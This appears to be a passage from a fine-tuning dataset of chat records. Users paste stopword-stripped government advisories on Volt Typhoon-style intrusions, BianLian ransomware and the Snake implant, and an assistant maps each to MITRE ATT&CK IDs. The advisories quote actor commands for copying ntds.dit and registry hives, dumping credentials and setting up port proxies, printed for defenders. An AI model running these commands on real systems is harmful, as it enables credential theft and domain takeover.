techniques advisory help net defenders hunt activity systems provides many network host artifacts associated activity occurring network initially compromised focus command lines used cyber actor indicators compromise iocs summary included end advisory especially living land techniques possible command lines might appear system result benign activity would false positive indicators malicious activity defenders must evaluate matches determine significance applying knowledge system baseline behavior additionally creating detection logic based commands network defenders account variability command string arguments items ports used may differ across environments artifacts network artifacts actor leveraged compromised small officehome office soho network devices intermediate infrastructure obscure activity much command control c2 traffic emanate local isps geographic area victim owners soho devices ensure network management interfaces exposed internet avoid repurposed redirectors malicious actors must exposed internet device owners operators ensure follow zero trust principles maintain highest level authentication access controls possible actor used earthworm custom fast reverse proxy frp client hardcoded c2 callbacks ports 8080 8443 8043 8000 10443 various filenames including limited ciscoupexe cl64exe vm3dserviceexe watchdogdexe winexe wmipresvexe wmiprvseexe host artifacts windows management instrumentation wmiwmic actor executed following command gather information local drives cmdexe c wmic path win32logicaldisk get captionfilesystemfreespacesizevolumename command require administrative credentials return results command uses command prompt execute windows management instrumentation command line wmic query collecting information storage devices local host including drive letter file system eg new technology file systemntfs free space drive size bytes optional volume name windows management instrumentation wmi builtin windows tool allows user access management information hosts enterprise environment command line version wmi called wmic default wmi tracing enabled wmi commands executed associated user might available additional information wmi events tracing found references section advisory ntdsdit active directory database actor may try exfiltrate ntdsdit file system registry hive windows domain controllers dcs network perform password cracking ntdsdit file main active directory ad database file default stored systemrootntdsntdsdit file contains information users groups group memberships password hashes users domain system registry hive contains boot key used encrypt information ntdsdit file although ntdsdit file locked use ad copy made creating volume shadow copy extracting ntdsdit file shadow copy system registry hive may also obtained shadow copy following example commands show actor creating shadow copy extracting copy ntdsdit file cmd c vssadmin create shadow forc cwindowstempfilenametmp cmd c copy globalrootdeviceharddiskvolumeshadowcopy3windowsntdsntdsdit cwindowstemp cwindowstempfilenametmp builtin ntdsutilexe tool performs actions using single command several ways execute ntdsutilexe including running elevated command prompt cmdexe using wmiwmic powershell defenders look execution ntdsutilexe commands using long short combination notations example long notation command activate instance ntds ifm also executed using short notation ac ntds table 1 provides long short forms arguments used sample ntdsutilexe command along brief description arguments actor executed wmic commands create copy ntdsdit file system registry hive using ntdsutilexe following actor commands standalone example multiple examples provided show syntax file paths may differ per environment wmic process call create ntdsutil ac ntds ifm create full cwindowstemppro wmic process call create cmdexe c ntdsutil ac ntds ifm create full cwindowstemppro wmic process call create cmdexe c mkdir cwindowstemptmp ntdsutil ac ntds ifm create full cwindowstemptmp cmdexe c wmic process call create cmdexe c mkdir cwindowstempmcafeelogs ntdsutil ac ntds ifm create full cwindowstempmcafeelogs cmdexe q c wmic process call create cmdexe c mkdir cwindowstemptmp ntdsutil ac ntds ifm create full cwindowstemptmp 1 127001admin 21 note timestamp value would epoch timestamp following format like 1684956600123456 actor command creates copy ntdsdit database system security registry hives cwindowstempfolder directory folder replaced path specified command eg pro tmp mcafeelogs default hidden admin share mapped cwindows last command direct standard output error messages command file within folder specified actor also saved files directly cwindowstemp cuserspublic directories entirety directory structures analyzed ntdsutilexe creates two subfolders directory specified command active directory folder contains ntdsdit ntdsjfm files registry folder contains system security hives defenders look folder structure across network path specified commandactive directoryntdsdit path specified commandactive directoryntdsjfm path specified commandregistrysecurity path specified commandregistrysystem one example commands executed several successive log entries created application log esent source associated events viewed windows event viewer navigating windows logs application narrow results relevant events select filter current log actions menu right side screen event sources dropdown check box next esent limit logs id numbers 216 325 326 327 clicking ok box apply filters results since esent logging used extensively throughout windows defenders focus events reference ntdsdit events present events details contain file path file copies created since files deleted enhanced logging may configured hosts file path greatly aid hunt operation identifying user associated activity also critical step hunt operation actions compromisedor actorcreateduser account helpful understand additional actor ttps well breadth actors actions note actor exfiltrate ntdsdit system registry hive entire domain considered compromised actor generally able crack password hashes domain user accounts create accounts andor join unauthorized systems domain occurs defenders follow guidance removing malicious actors victim networks cisas eviction guidance network affected solarwinds active directorym365 compromise addition ttps used actor copy ntdsdit file following tools could used actor obtain information secretsdumppy note script component impacket actor known use invokeninjacopy powershell dsinternals powershell fgdump metasploit best practices securing ntdsdit include hardening domain controllers monitoring event logs ntdsutilexe similar process creations additionally use administrator privileges audited validated confirm legitimacy executed commands portproxy actor used following commands enable port forwarding host cmdexe c netsh interface portproxy add v4tov4 listenaddress0000 listenport9999 connectaddress connectport8443 protocoltcp cmdexe c netsh interface portproxy add v4tov4 listenport50100 listenaddress0000 connectport1433 connectaddress rfc1918 internal ip address replaced ipv4 address internal network omitting netsh builtin windows command line scripting utility display modify network settings host including windows firewall portproxy add command used create hostport proxy forward incoming connections provided listenaddress listenport connectaddress connectport administrative privileges required execute portproxy command portproxy command create registry key hklmsystemcurrentcontrolsetservicesportproxyv4tov4tcp path defenders look presences keys path investigate anomalous entries note using port proxies common legitimate system administration since constitute backdoor network bypasses firewall policies administrators limit port proxy usage within environments enable period time required defenders also use unusual ip addresses ports command lines registry entries identify hosts potentially included actor actions hosts network examined new unusual firewall port forwarding rules well ip addresses ports specified actor network traffic logging available defenders attempt identify traffic forwarded though port proxies aid hunt operation previously mentioned identifying associated user account made networking changes also aid hunt operation firewall rule additions changes viewed windows event viewer navigating applications service logs microsoft windows windows firewall advanced security firewall addition hostlevel changes defenders review perimeter firewall configurations unauthorized changes andor entries may permit external connections internal hosts actor known target perimeter devices operations firewall logs reviewed connections systems ports listed portproxy commands discovered powershell actor used following powershell command identify successful logons host geteventlog security instanceid 4624 note event id 4624 logged user successfully logs host contains useful information logon type eg interactive networking associated user computer account names logon time event id 4624 entries viewed windows event viewer navigating windows logs security powershell logs viewed event viewer applications service logs windows powershell command identifies user account currently leveraging access network identify users logged host identify actions logged actor using password spray technique may several failed logon event id 4625 events several different user accounts followed one successful logons event id 4624 within short period time period may vary actor range seconds minutes actor using brute force password attempts single user account may several event id 4625 entries account followed successful logon event id 4624 defenders also look abnormal account activity logons outside normal working hours impossible timeanddistance logons eg user logging two geographically separated locations time impacket actor regularly employs use impackets wmiexec redirects output file within victim hosts admin share cwindows containing epoch timestamp name following example dir command executed wmiexecpy cmdexe q c dir 1 127001admin1684956600123456 21 note discovery entry similar example windows event log andor file name similar format may evidence malicious activity investigated event filename discovered epoch timestamp within filename reflects time execution default used help scope threat hunting activities enumeration environment following commands used actor enumerate network topology active directory structure information target environment arp acurl wwwipapicomdnscmd enumrecords zone redacteddnscmd enumzonesdnscmd enumrecords redacted additionalipconfig allldifdeexe f cwindowstempfilenametxt p subtreenet localgroup administratorsnet group dom net group domain admins domnetsh interface firewall show allnetsh interface portproxy show allnetsh interface portproxy show v4tov4netsh firewall show allnetsh portproxy show v4tov4netstat anoreg query hklmsoftwaresysteminfotasklist vwhoamiwmic volume list briefwmic service briefwmic product list briefwmic baseboard list fullwevtutil qe security rdtrue ftext qsystemeventid4624 timecreatedsystemtimeredacted eventdatadataredacted additional credential theft actor also used following commands identify additional opportunities obtaining credentials environment dir cusersredactedsshknownhostsdir cusersredactedappdataroamingmozillafirefoxprofilesmimikatzexereg query hklmsoftwareopensshreg query hklmsoftwareopensshagentreg query hklmsoftwarerealvncreg query hklmsoftwarerealvncvncserverreg query hklmsoftwarerealvncallusersreg query hklmsoftwarerealvncallusersvncserverreg query hkcusoftwareredactedputtysessionreg save hklmsam ssdatreg save hklmsystem sydat additional commands actor executed following additional commands 7zexe p redacted cwindowstempredacted7zcwindowssystem32pcwrunexecusersadministratordesktopwinexecwindowssystem32cmdbakexe c ping n 1 127001 cwindowstempputtylog cwindowstemptmplogcmdexe c dir 127001c odcmdexe c ping n 1 ip addresscmdexe c wmic userusername passwordpassword process call create net stop service name cwindowstemptmplogcmdexe q c cd 1 127001admintimestamp value 21net use 127001ipc dpowershell startprocess filepath cwindowstempfilenamebat windowstyle hiddenrarexe redacted cwindowstempredacted dredactedwmic noderedacted userredacted passwordredacted cmd c whoamixcopy cwindowstemphp dredacted mitigations authoring agencies recommend organizations implement mitigations improve organizations cybersecurity posture basis threat actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections defenders harden domain controllers monitor event logs2t ntdsutilexe similar process creations additionally use administrator privileges audited validated confirm legitimacy executed commands administrators limit port proxy usage within environments enable period time required2x defenders investigate unusual ip addresses ports command lines registry entries firewall logs identify hosts potentially involved actor actions addition hostlevel changes defenders review perimeter firewall configurations unauthorized changes andor entries may permit external connections internal hosts defenders also look abnormal account activity logons outside normal working hours impossible timeanddistance logons eg user logging two geographically separated locations time defenders forward log files hardened centralized logging server preferably segmented network2f logging recommendations able detect activity described csa defenders set audit policy windows security logs include audit process creation include command line process creation events addition accessing logs otherwise default logging configurations may contain necessary information enabling options create event id 4688 entries windows security log view command line processes given cost difficulty logging analyzing kind activity organization must limit requirements focus enabling kind logging systems externally facing perform authentication authorization especially including domain controllers hunt malicious wmi powershell activity defenders also log wmi powershell events default wmi tracing deep powershell logging enabled enabled following configuration instructions linked references section actor takes measures hide tracks clearing logs ensure log integrity availability defenders forward log files hardened centralized logging server preferably segmented network architecture makes harder actor cover tracks evidence actions captured multiple locations defenders also monitor logs event id 1102 generated audit log cleared event id 1102 entries investigated logs generally cleared known actor tactic cover tracks even event log cleared host logs also stored logging server copy log preserved activity often linked malicious exploitation edge devices network management devices defenders enable logging edge devices include system logs able identify potential exploitation lateral movement also enable networklevel logging sysmon webserver middleware network device logs indicators compromise iocs summary indicators compromise iocs summary ttps exploiting vulnerabilities widely used software including limited cve202140539manageengine adselfservice plus apt actors exploiting newly identified vulnerability manageengine adselfservice plus cve202127860fatpipe warp ipvpn mpvpn apt group exploiting 0day fatpipe warpmpvpn ipvpn software using webshells persistence exfiltration least webshells derived awen webshell using compromised smalloffice homeoffice soho devices eg routers obfuscate source activity common types include asus cisco rv draytek vigor fatpipe ipvpnmpvpnwarp fortinet fortigate netgear prosafe zyxel usg devices common cves devices mitigation guidance found joint cybersecurity advisory top cves actively exploited peoples republic china statesponsored cyber actors using living land tools discovery lateral movement collection activities include certutil dnscmd ldifde makecab net usergroupuse netsh nltest ntdsutil powershell req querysave systeminfo tasklist wevtutil wmic xcopy selective clearing windows event logs system logs technical artifacts remove evidence intrusion activity using open source hacktools tools fast reverse proxy frp probably derived publiclyavailable fatedier earthworm variants impacket detect impacket usage see joint cybersecurity advisory impacket exfiltration tool used steal sensitive information defense industrial base organization mimikatzexe remote administration tools defenders consult joint cybersecurity advisory protecting malicious use remote monitoring management software command execution file names directory paths used commands meant serve examples actual names paths may differ depending environment activity defenders account variants performing queries note many commands derivatives common system administration commands could generate false positives used alone without additional indicators 7zexe p redacted cwindowstempredacted7z cwindowstempcpstoolspsexecexe redacted cmd c cmdexe c netsh interface portproxy delete v4tov4 listenaddress0000 listenport9999cwindowssystem32pcwrunexe cusersadministratordesktopwinexecmdexe c dir redactedcusersredacted cwindowstempredactedtmpcmdexe c wmic process call create cmdexe c mkdir cwindowstempmcafeelogs ntdsutil ac ntds ifm create full cwindowstempmcafeelogscmdexe q c cd 1 127001admintimestamp value 21cmdexe q c cd 1 127001admin16524709329400265 21cmdexe q c net group domain admins dom 1127001admintimestamp value 21 cmdexe q c wmic process call create cmdexe c mkdir cwindowstemptmp ntdsutil ac ntds ifm create full cwindowstemptmp 1 127001admintimestamp value 21dredactedxcopy cwindowstemphp dredacted geteventlog security instanceid 4624ldifdeexe f cwindowstempciscouptxt p subtreemakecab backup210829020000zip webappsadssphtmllocklicmove redactedcuserspublicappfileregistrysystem backup210829020000zipnetsh interface portproxy add v4tov4 listenaddress0000 listenport9999 connectaddressredacted connectport8443 protocoltcpnetsh interface portproxy delete v4tov4 listenaddress0000 listenport9999rarexe redacted cwindowstempdmbc2c61tmpstartprocess filepath cwindowstempfilenamebat windowstyle hidden 1 note batch file question filenamebat could use name discernable pattern determined time wmic process call create cmdexe c mkdir cuserspublicappfile ntdsutil ac ntds ifm create full cuserspublicappfile q qwmic process call create cmdexe c mkdir cwindowstemptmp ntdsutil ac ntds ifm create full cwindowstemptmpwmic process call create cmdexe c ntdsutil ac ntds ifm create full cwindowstempprowmic process call create ntdsutil ac ntds ifm create full cwindowstemp command line patterns certain patterns commands asterisks wildcards used identify potentially malicious commands cmdexe c dir cmdexe q c 1 127001admin1 powershell startprocess filepath cwindowstempexe windowstyle hidden file paths common paths files executables used actor found include cuserspublicappfile including subdirectories cperflogs including subdirectories cwindowstemp including subdirectories file names file names actor previously used things malware scripts tools include addition file names paths malicious files names believed randomly created following format also discovered cwindowsazaz8exe sha256 file hashes f4dd44bc19c19056794d29151a5b1bb76afd502388622e24c863a8494af147dd ef09b8ff86c276e9b475a6ae6b54f08ed77e09e169f7fc0872eb1d427ee27d31 d6ebde42457fe4b2a927ce53fc36f465f0000da931cfab9b79a36083e914ceca 472ccfb865c81704562ea95870f60c08ef00bcd2ca1d7f09352398c05be5d05d 66a19f7d2547a8a85cee7a62d0b6114fd31afdee090bd43f36b89470238393d7 3c2fe308c0a563e06263bbacf793bbe9b2259d795fcc36b953793a7e499e7f71 41e5181b9553bbe33d91ee204fe1d2ca321ac123f9147bb475c0ed32f9488597 c7fee7a3ffaf0732f42d89c4399cbff219459ae04a81fc6eff7050d53bd69b99 3a9d8bb85fbcfe92bae79d5ab18e4bca9eaf36cea70086e8d1ab85336c83945f fe95a382b4f879830e2666473d662a24b34fccf34b6b3505ee1b62b32adafa15 ee8df354503a56c62719656fae71b3502acf9f87951c55ffd955feec90a11484 useragent cases following useragent string including extra spacing identified performing reconnaissance activities actor mozilla50 windows nt 61 wow64 rv680 gecko20100101 firefox680 note spacing gecko 3 tabs followed 4 spaces yara rules references active directory domain controller hardening best practices best practices securing active directory microsoft learn cisa regional cyber threats prc statesponsored activity china cyber threat overview advisories microsoft threat intelligence blog volt typhoon activity volt typhoon targets us critical infrastructure livingofftheland techniques microsoft security blog ntdsutilexe overview ntdsutil microsoft learn powershell best practices keeping powershell security measures use embrace logging configuration greater visibility powershell logging mandiant google cloud blog windows command line process auditing overview command line process auditing microsoft learn windows defender firewall best practices configure firewall rules group policy windows security microsoft learn logging configuration configure windows firewall logging windows security microsoft learn windows management instrumentation events tracing wmi activity win32 apps microsoft learn tracing activity tracing wmi activity win32 apps microsoft learn windows password spraying logging playbook configuration password spray investigation microsoft learn acknowledgements nsa cybersecurity collaboration center along authoring agencies acknowledge amazon web services aws security broadcom cisco talos googles threat analysis group lumen technologies mandiant microsoft threat intelligence msti palo alto networks secureworks sentinelone trellix additional industry partners collaboration advisory disclaimer endorsement information opinions contained document provided without warranties guarantees reference herein specific commercial products process service trade name trademark manufacturer otherwise constitute imply endorsement recommendation favoring authoring agencies governments guidance shall used advertising product endorsement purposes trademark recognition active directory microsoft powershell windows registered trademarks microsoft corporationmitre attck registered trademarks mitre corporation purpose document developed furtherance authoring agencies cybersecurity missions including responsibilities identify disseminate threats develop issue cybersecurity specifications mitigations information may shared broadly reach appropriate stakeholders contact us organizations urgently report anomalous activity incidents including based upon technical information associated cybersecurity advisory cisa reportcisadhsgov cisagovreport fbi via local fbi field office listed httpswwwfbigovcontactusfieldoffices nsa cybersecurity report questions feedback cybersecurityreportsnsagov nsa defense industrial base inquiries cybersecurity services dibdefensecybernsagov nsa media inquiries press desk 4436340721 mediarelationsnsagov australian organizations visit cybergovau call 1300 292 371 1300 cyber 1 report cybersecurity incidents access alerts advisories canadian organizations report incidents emailing cccs contactcybergcca new zealand organizations report cyber security incidents incidentsncscgovtnz call 04 498 7654 united kingdom organizations report significant cyber security incident ncscgovukreportanincident monitored 24 hours urgent assistance call 03000 200 973 appendix mitre attck techniques tables capture referenced threat actor tactics techniques advisory product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.003, T1016, T1033, T1047, T1059.001, T1059.003, T1069.002, T1070, T1070.001, T1082, T1090, T1090.002, T1110, T1110.003, T1190, T1505.003, T1555"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate cyber threats bianlian ransomware data extortion strictly limit use rdp remote desktop services disable commandline scripting activities permissions restrict usage powershell update windows powershell powershell core latest version summary note joint cybersecurity advisory csa part ongoing stopransomware effort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa australian cyber security centre acsc releasing joint cybersecurity advisory disseminate known bianlian ransomware data extortion group iocs ttps identified fbi acsc investigations march 2023 bianlian ransomware developer deployer data extortion cybercriminal group targeted organizations multiple us critical infrastructure sectors since june 2022 also targeted australian critical infrastructure sectors addition professional services property development group gains access victim systems valid remote desktop protocol rdp credentials uses opensource tools commandline scripting discovery credential harvesting exfiltrates victim data via file transfer protocol ftp rclone mega bianlian group actors extort money threatening release data payment made bianlian group originally employed doubleextortion model encrypted victims systems exfiltrating data however around january 2023 shifted primarily exfiltrationbased extortion fbi cisa acsc encourage critical infrastructure organizations small mediumsized organizations implement recommendations mitigations section advisory reduce likelihood impact bianlian ransomware incidents download pdf version report 710kb aa23136a stopransomware bianlian ransomware group pdf 64423 kb downloadable copy iocs 35kb see aa23136a stix xml xml 3472 kb downloadable copy iocs json format see aa23136astixjson technical details notethis advisory uses themitre attck enterprise framework version 13 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool bianlian ransomware developer deployer data extortion cybercriminal group fbi observed bianlian group targeting organizations multiple us critical infrastructure sectors since june 2022 australia acsc observed bianlian group predominately targeting private enterprises including one critical infrastructure organization bianlian group originally employed doubleextortion model exfiltrated financial client business technical personal files leverage encrypted victims systems 2023 fbi observed bianlian shift primarily exfiltrationbased extortion victims systems left intact acsc observed bianlian shift exclusively exfiltrationbased extortion bianlian actors warn financial business legal ramifications payment made initial access bianlian group actors gain initial access networks leveraging compromised remote desktop protocol rdp credentials likely acquired initial access brokers via phishing command control bianlian group actors implant custom backdoor specific victim written go see indicators compromise section example install remote management access softwareeg teamviewer atera agent splashtop anydeskfor persistence command control fbi also observed bianlian group actors create andor activate local administrator accounts change account passwords defense evasion bianlian group actors use powershell windows command shell disable antivirus tools specifically windows defender antimalware scan interface amsi bianlian actors modify windows registry disable tamper protection sophos savenabled sedeenabled savservice services enables uninstall services see appendix windows powershell command shell activity additional information including specific commands used discovery bianlian group actors use combination compiled tools first download victim environment learn victims environment bianlian group actors used advanced port scanner network scanner used find open ports network computers retrieve versions programs running detected ports softperfect network scanner netscanexe network scanner ping computers scan ports discover shared folders sharpshares enumerate accessible network shares domain pingcastle enumerate active directory ad pingcastle provides ad map visualize hierarchy trust relationships bianlian actors also use native windows tools windows command shell query currently loggedin users query domain controller identify groups accounts domain adminsand domain computersgroups1087002 users domain retrieve list domain controllers domain trusts identify accessible devices network see appendix windows powershell command shell activityfor additional information including specific commands used credential access bianlian group uses valid accounts lateral movement network pursue followon activity obtain credentials bianlian group actors use windows command shell find unsecured credentials local machine fbi also observed bianlian harvest credentials local security authority subsystem service lsass memory download rdp recognizer tool could used brute force rdp passwords check rdp vulnerabilities victim system attempt access active directory domain database ntdsdit one case fbi observed bianlian actors use portable executable version impacket tool secretsdumppy move laterally domain controller harvest credential hashes note impacket python toolkit programmatically constructing manipulating network protocols command shell impacket user credentials run commands remote device using windows management protocols required support enterprise network threat actors run portable executable files victim systems using local user rights assuming executable blocked application allowlist antivirus solution see appendix windows powershell command shell activity additional information persistence lateral movement bianlian group actors use psexec rdp valid accounts lateral movement prior using rdp bianlian actors used command shell native windows tools add user accounts local remote desktop usersgroup modified added accounts password modified windows firewall rules allow incoming rdp traffic see appendix windows powershell command shell activity additional information one case fbi found forensic artifact expexe compromised system likely exploits netlogon vulnerability cve20201472 connects domain controller collection fbi observed bianlian group actors using malware systemexe enumerates registry files copies clipboard data users exfiltration impact bianlian group actors search sensitive files using powershell scripts see appendix windows powershell command shell activity exfiltrate data extortion prior january 2023 bianlian actors encrypted files exfiltration double extortion bianlian group uses file transfer protocol ftp rclone tool used sync files cloud storage exfiltrate data fbi observed bianlian group actors install rclone files generic typically unchecked folders programdatavmware music folders acsc observed bianlian group actors use mega filesharing service exfiltrate victim data bianlians encryptor encryptorexe modified encrypted files bianlianextension encryptor created ransom note look instructiontxt affected directory see figure 1 example ransom note according ransom note bianlian group specifically looked encrypted exfiltrated financial client business technical personal files victim refuses pay ransom demand bianlian group threatens publish exfiltrated data leak site maintained tor network ransom note provides tox id a4b3b0845da242a64bf17e0db4278edf85855739667d3e2ae8b89d5439015f07e81d12d767fc vary across victims tox id directs victim organization tox chat viahttpsqtoxgithubioand includes alternative contact email address swikipediaonionmailorgor xxxmail2torcom email address also address listed groups tor site contact information section victim company assigned unique identifier included ransom note bianlian group receives payments unique cryptocurrency wallets victim company bianlian group engages additional techniques pressure victim paying ransom example printing ransom note printers compromised network employees victim companies also reported receiving threatening telephone calls individuals associated bianlian group indicators compromise ioc see table 1 iocs obtained fbi investigations march 2023 mitre attck techniques see table 2 referenced threat actor tactics techniques advisory mitigations fbi cisa acsc recommend organizations implement mitigations improve organizations cybersecurity posture basis threat actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats ttps visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections reduce threat malicious actors using remote access tools auditing remote access tools network identify currently used andor authorized software reviewing logs execution remote access software detect abnormal use programs running portable executablecpg 2t using security software detect instances remote access software loaded memory requiring authorized remote access solutions used within network approved remote access solutions virtual private networks vpns virtual desktop interfaces vdis blocking inbound outbound connections common remote access software ports protocols network perimeter implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlisting solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation see nsa cybersecurity information sheet enforce signed software execution policies additional guidance strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n restrict use powershell using group policy grant specific users casebycase basis typically users administrators manage network windows operating systems oss permitted use powershellcpg 2e update windows powershell powershell core latest version uninstall earlier powershell versions logs windows powershell prior version 50 either nonexistent record enough detail aid enterprise monitoring incident response activitiescpg 1e 2s 2t enable enhanced powershell loggingcpg 2t 2u powershell logs contain valuable data including historical os registry interaction possible ttps threat actors powershell use ensure powershell instances using latest version module script block transcription logging enabled enhanced logging two logs record powershell activity powershellwindows event log powershell operationallog fbi cisa recommend turning two windows event logs retention period least 180 days logs checked regular basis confirm whether log data deleted logging turned set storage size permitted logs large possible configure windows registry require user account control uac approval psexec operations requiring administrator privileges reduce risk lateral movement psexec review domain controllers servers workstations active directories new andor unrecognized accountscpg 4c audit user accounts administrative privileges configure access controls according principle least privilegecpg 2e reduce threat credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally implement credential guard windows 10 server 2016refer microsoft manage windows defender credential guard information windows server 2012r2 enable protected process light local security authority lsa refrain storing plaintext credentials scripts implement timebased access accounts set admin level highercpg 2a 2e example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory ad level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task addition fbi cisa acsc recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location eg hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization minimizes impact disruption business practices severe andor irretrievable datacpg 2r acsc recommends organizations follow 321 backup strategy organizations three copies data one copy production data two backup copies two different media disk tape one copy kept offsite disaster recovery require accounts password logins eg service account admin accounts domain admin accounts comply national institute standards technology nist standards developing managing password policies use longer passwords consisting least 15 characterscpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication services extent possible particularly webmail virtual private networks accounts access critical systemscpg 2h keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats organizations patch vulnerable software hardware systems within 24 48 hours vulnerability disclosure prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused portscpg 2v consider adding email banner emails received outside organizationcpg 2m ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa acsc recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa acsc recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see table 2 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa acsc recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach one central location us ransomware resources alerts cybergovau australian governments central location report cyber incidents including ransomware see advice alerts site also provides ransomware advisories businesses organizations help mitigate cyber threats cisamultistate information sharing analysis center msisac joint ransomware guide guidance mitigating responding ransomware attack nocost cyber hygiene services us organizations cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared including boundary logs showing communication foreign ip addresses sample ransom note communications bianlian actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office cisa cisagovreport australian organizations impacted require assistance regard ransomware incident contact acsc via 1300 cyber1 1300 292 371 submitting report cybergovau acknowledgements microsoft sophos contributed advisory appendix windows powershell command shell activity fbi investigations march 2023 fbi observed bianlian actors use commands table 3 acsc observed bianlian actors use commands disclaimer information report provided informational purposes fbi cisa acsc endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa acsc product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.001, T1003.003, T1012, T1018, T1021.001, T1033, T1046, T1048, T1053.005, T1059.001, T1059.003, T1069.002, T1078, T1083, T1098, T1105, T1112, T1115, T1133, T1135, T1136.001, T1219, T1482, T1486, T1537, T1552.001, T1562.001, T1562.004, T1566, T1567.002, T1587.001"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary snake implant considered sophisticated cyber espionage tool designed used center 16 russias federal security service fsb longterm intelligence collection sensitive targets conduct operations using tool fsb created covert peertopeer p2p network numerous snakeinfected computers worldwide many systems p2p network serve relay nodes route disguised operational traffic snake implants fsbs ultimate targets snakes custom communications protocols employ encryption fragmentation confidentiality designed hamper detection collection efforts identified snake infrastructure 50 countries across north america south america europe africa asia australia include united states russia although snake uses infrastructure across industries targeting purposeful tactical nature globally fsb used snake collect sensitive intelligence highpriority targets government networks research facilities journalists one example fsb actors used snake access exfiltrate sensitive international relations documents well diplomatic communications victim north atlantic treaty organization nato country within united states fsb victimized industries including education small businesses media organizations well critical infrastructure sectors including government facilities financial services critical manufacturing communications cybersecurity advisory csa provides background snakes attribution fsb detailed technical descriptions implants host architecture network communications csa also addresses recent snake variant yet widely disclosed technical information mitigation recommendations csa provided assist network defenders detecting snake associated activity information fsb russian statesponsored cyber activity please see joint advisory russian statesponsored criminal cyber threats critical infrastructure cisas russia cyber threat overview advisories webpage download pdf version report hunting russian intelligence snake malware pdf 411 mb introduction snake consider snake sophisticated cyber espionage tool fsbs arsenal sophistication snake stems three principal areas first snake employs means achieve rare level stealth host components network communications second snakes internal technical architecture allows easy incorporation new replacement components design also facilitates development interoperability snake instances running different host operating systems observed interoperable snake implants windows macos linux operating systems lastly snake demonstrates careful software engineering design implementation implant containing surprisingly bugs given complexity following open source reporting cybersecurity threat intelligence companies snake tactics techniques procedures ttps fsb implemented new techniques evade detection modifications implant enhanced challenges identifying collecting snake related artifacts directly hampering detection host networkbased defensive tools effectiveness type cyber espionage implant depends entirely longterm stealth since objective extended espionage operation involves remaining target months years provide consistent access important intelligence uniquely sophisticated aspects snake represent significant effort fsb many years enable type covert access background fsb began developing snake uroburos late 2003 development initial versions implant appeared completed around early 2004 cyber operations first conducted using implant shortly thereafter name uroburos appropriate fsb cycled nearly constant stages upgrade redevelopment even public disclosures instead abandoning name appears throughout early versions code fsb developers also left unique strings including ur0bursgotyou publicly come back haunt unique features early versions uroburos included low resolution image portion historical illustration uroboros german philosopher theologian jakob bhme one approach tertiary backdoor used image key image also embedded snakerelated components image blown higher resolution shown addition early fsb developers snake implant left portions unique code throughout implant reveal inside jokes 